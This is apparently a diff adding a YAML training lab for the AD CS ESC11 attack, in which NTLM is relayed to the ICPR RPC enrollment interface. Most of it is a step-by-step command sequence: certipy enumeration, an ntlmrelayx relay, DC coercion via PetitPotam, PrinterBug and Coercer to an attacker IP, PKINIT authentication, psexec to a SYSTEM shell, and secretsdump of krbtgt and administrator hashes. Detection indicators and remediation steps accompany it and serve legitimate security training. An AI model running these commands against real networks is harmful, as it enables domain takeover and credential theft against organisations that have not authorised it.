@@ -1,0 +1,201 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC11 — NTLM Relay to RPC Certificate Enrollment (ICPR)"
+id: "ad-adcs-esc11-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "expert"
+estimated_time: "100 minutes"
+
+description: |
+  Exploit Active Directory Certificate Services (AD CS) by relaying NTLM
+  authentication to the MS-ICPR (ICertPassage) RPC enrollment interface
+  (ESC11). When the IF_ENFORCEENCRYPTICERTREQUEST flag is not set on the CA,
+  the RPC interface accepts unencrypted connections without NTLM signing,
+  allowing attackers to coerce authentication and relay it to obtain
+  certificates for any domain principal, including Domain Controllers.
+
+learning_objectives:
+  - Understand the MS-ICPR RPC interface and its security requirements
+  - Identify CAs vulnerable to ESC11 via missing IF_ENFORCEENCRYPTICERTREQUEST
+  - Relay NTLM authentication to RPC endpoints for certificate issuance
+  - Chain ESC11 with coercion techniques for domain-wide compromise
+
+tools:
+  - certipy
+  - ntlmrelayx.py (impacket)
+  - coerce
+  - petitpotam
+  - printerbug
+  - impacket-psexec
+
+prerequisites:
+  - Valid low-privilege domain credentials
+  - CA with IF_ENFORCEENCRYPTICERTREQUEST flag NOT set
+  - Network access to CA RPC endpoint (TCP 135, dynamic RPC ports)
+  - Ability to coerce authentication from target (e.g., Domain Controller)
+  - NTLM signing not enforced on relay path
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate CA RPC configuration for ESC11 vulnerability"
+    commands:
+      - "# Install Certipy"
+      - "pip3 install certipy-ad"
+      - "# Full enumeration with vulnerability detection"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout"
+      - "# Look specifically for ESC11"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] | grep -E '(ESC11|ICPR|RPC|Enforce Encryption)'"
+      - "# Check CA configuration manually"
+      - "certutil -config '[ca_server]\\[ca_name]' -getreg 'CA\InterfaceFlags'"
+    expected_output: "CAs flagged as ESC11 with 'Enforce Encryption for Requests: Disabled'"
+    detection: "LDAP queries for CA interface flags; certipy enumeration"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Verify RPC endpoint vulnerability and identify target templates"
+    commands:
+      - "# Check if IF_ENFORCEENCRYPTICERTREQUEST is disabled"
+      - "# If InterfaceFlags does NOT include IF_ENFORCEENCRYPTICERTREQUEST (0x00000100), the CA is vulnerable"
+      - "# Enumerate available templates for RPC enrollment"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -stdout -enabled"
+      - "# Look for templates suitable for authentication"
+      - "# - User template (for user accounts)"
+      - "# - Machine template (for computer accounts)"
+      - "# - DomainController template (for DC compromise)"
+      - "# Check RPC port availability"
+      - "nmap -p 135,49152-65535 --script=rpc-info [ca_server]"
+    expected_output: "Confirmation of vulnerable RPC endpoint and suitable certificate templates"
+    detection: "Port scanning of CA RPC ports; template enumeration"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Set up NTLM relay to CA RPC endpoint"
+    commands:
+      - "# Using ntlmrelayx with RPC mode ICPR"
+      - "ntlmrelayx.py -t rpc://[ca_ip] -rpc-mode ICPR -icpr-ca-name '[ca_name]' -smb2support --template 'DomainController'"
+      - "# Alternative: Using Certipy relay"
+      - "certipy relay -target 'rpc://[ca_server]' -ca '[ca_name]' -template 'DomainController'"
+      - "# For user account targeting"
+      - "ntlmrelayx.py -t rpc://[ca_ip] -rpc-mode ICPR -icpr-ca-name '[ca_name]' -smb2support --template 'User'"
+    expected_output: "Relay server listening for incoming NTLM authentications to RPC CA"
+    detection: "ntlmrelayx/certipy relay processes; SMB server listening"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Coerce authentication from Domain Controller"
+    commands:
+      - "# Coerce DC authentication using Coercer"
+      - "coercer coerce -l [attacker_ip] -t [dc_ip] -d [domain] -u [username] -p [password]"
+      - "# Alternative: PetitPotam"
+      - "python3 PetitPotam.py [attacker_ip] [dc_ip]"
+      - "# Alternative: PrinterBug"
+      - "python3 printerbug.py '[domain]/[username]:[password]'@[dc_ip] [attacker_ip]"
+      - "# Alternative: Force NTLM via WebDAV"
+      - "# Host a malicious XML file and trigger WebClient service"
+    expected_output: "Coerced NTLM authentication from DC relayed to CA RPC endpoint"
+    detection: "Unexpected SMB/RPC connections from DC to attacker IP"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Obtain and use the relayed certificate"
+    commands:
+      - "# ntlmrelayx saves the certificate as base64"
+      - "# Decode and save the PFX certificate"
+      - "echo '[base64_cert]' | base64 -d > dc01.pfx"
+      - "# Authenticate with the certificate via PKINIT"
+      - "certipy auth -pfx dc01.pfx -dc-ip [dc_ip]"
+      - "# Use the resulting TGT"
+      - "export KRB5CCNAME=dc01.ccache"
+      - "impacket-psexec -k -no-pass [domain]/'DC01$'@[dc_ip]"
+    expected_output: "TGT for DC01$ machine account; SYSTEM shell on domain controller"
+    detection: "Certificate issuance via RPC from unexpected source; PKINIT auth for DC$"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Perform DCSync with relayed DC certificate"
+    commands:
+      - "# Use the DC certificate to perform DCSync"
+      - "impacket-secretsdump -k -no-pass [domain]/'DC01$'@[dc_ip] -just-dc"
+      - "# Or use the extracted NTLM hash"
+      - "impacket-secretsdump -hashes ':[dc_ntlm_hash]' '[domain]/Administrator@[dc_ip]' -just-dc"
+      - "# Dump KRBTGT hash for golden ticket"
+      - "impacket-secretsdump -hashes ':[dc_ntlm_hash]' '[domain]/Administrator@[dc_ip]' -just-dc-user 'krbtgt'"
+    expected_output: "Domain hashes including Administrator and KRBTGT"
+    detection: "DCSync activity from DC machine account (Event ID 4662)"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "MITRE ATT&CK"
+    control: "T1557"
+    description: "Man-in-the-Middle: NTLM Relay"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-8"
+    description: "Transmission Confidentiality and Integrity"
+  - standard: "CIS Controls v8"
+    control: "12.1"
+    description: "Ensure that only approved ports, protocols, and services are running"
+
+detection:
+  network_indicators:
+    - "NTLM authentication to CA RPC endpoint from unexpected IPs"
+    - "SMB/RPC coercion traffic from DC to attacker-controlled hosts"
+    - "RPC dynamic port connections to CA from non-standard sources"
+  log_indicators:
+    - "Event ID 4886 (CA): Certificate requested via RPC enrollment"
+    - "Event ID 4887 (CA): Certificate issued via RPC"
+    - "Event ID 4768: Kerberos TGT via certificate for machine account"
+    - "Event ID 4624: NTLM logon from unexpected source"
+    - "Defender for Identity: NTLM relay to AD CS RPC alert"
+  endpoint_indicators:
+    - "Coercer/PetitPotam/PrinterBug execution"
+    - "ntlmrelayx.py with -rpc-mode ICPR"
+    - "certipy relay targeting RPC endpoints"
+    - "Certificate files created after coercion attempts"
+
+remediation:
+  immediate:
+    - "Enable IF_ENFORCEENCRYPTICERTREQUEST on all CAs immediately"
+    - "certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST"
+    - "Restart certsvc service after making changes"
+    - "Block inbound SMB/RPC from untrusted sources to domain controllers"
+    - "Disable WebClient service to prevent WebDAV-based coercion"
+  long_term:
+    - "Enforce SMB signing across the entire domain"
+    - "Enable Extended Protection for Authentication (EPA) on all services"
+    - "Consider disabling RPC enrollment and using only HTTPS Web Enrollment"
+    - "Implement network segmentation to limit CA exposure"
+    - "Monitor for NTLM relay attempts to critical infrastructure"
+    - "Regular CA configuration audits using Certipy"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  ca_ip: "192.168.1.11"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  username: "jsmith"
+  password: "Password123"
+  attacker_ip: "192.168.1.50"
+  dc_ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+  base64_cert: "MIIS..."
+
+assessment_questions:
+  - "What is the difference between ESC8 and ESC11?"
+  - "What flag must be disabled for ESC11 to be possible?"
+  - "How does IF_ENFORCEENCRYPTICERTREQUEST prevent NTLM relay to RPC?"
+  - "What templates are most dangerous when combined with ESC11?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/"
+    title: "Relaying to AD Certificate Services over RPC - Compass Security"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
+  - url: "https://www.hackingarticles.in/adcs-esc11-relaying-ntlm-to-icpr/"
+    title: "ADCS ESC11 – Relaying NTLM to ICPR - Hacking Articles"
